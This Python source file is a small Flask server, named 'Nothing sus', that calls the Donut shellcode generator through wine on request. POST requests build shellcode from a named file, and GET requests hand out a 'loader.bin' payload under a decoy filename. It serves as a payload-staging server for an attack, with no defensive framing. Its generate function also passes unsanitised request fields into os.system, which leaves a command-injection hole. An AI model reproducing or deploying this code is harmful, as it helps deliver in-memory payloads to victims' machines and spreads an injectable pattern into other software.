from re import A
from flask import Flask, request, make_response, send_file
import argparse
import os
app = Flask("Nothing sus")

def generate(payloadName, arc, args): # https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md

    os.system("wine /donut/donut.exe /donut/files/{} -a {} -p\"{}\"".format(payloadName, arc, args.replace("\"", "\\\"")))
    return True


@app.route('/', methods=['POST','GET'])
def index():

    ### Parsing POST data and setting defaults ###
    if request.method == 'POST':
        try:
            file = request.json['file']
        except:
            return "No file or file not found"

        try:
            arch = int(request.json['arch'])
        except:
            arch = 2 # default x64 arch

        try:
            args = request.json['args']
        except:
            args = ""

        if generate(file, arch, args):
            return "Done"
        else:
            return "Shellcode borked up?"
    elif request.method == 'GET':
        return send_file('/donut/serv/loader.bin', attachment_filename='bruh')

if __name__ == '__main__':

    ### Parsing Arguments for server setup ###
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", nargs='?', const=1, default="0.0.0.0", help="Interface to listen on. 0.0.0.0 is default")
    parser.add_argument("-p", "--port", dest="port", nargs='?', const=1, default=8081, type=int, help="Port to listen on. 8081 is default.")
    args = parser.parse_args()

    app.run(debug=False, host=args.interface, port=args.port)
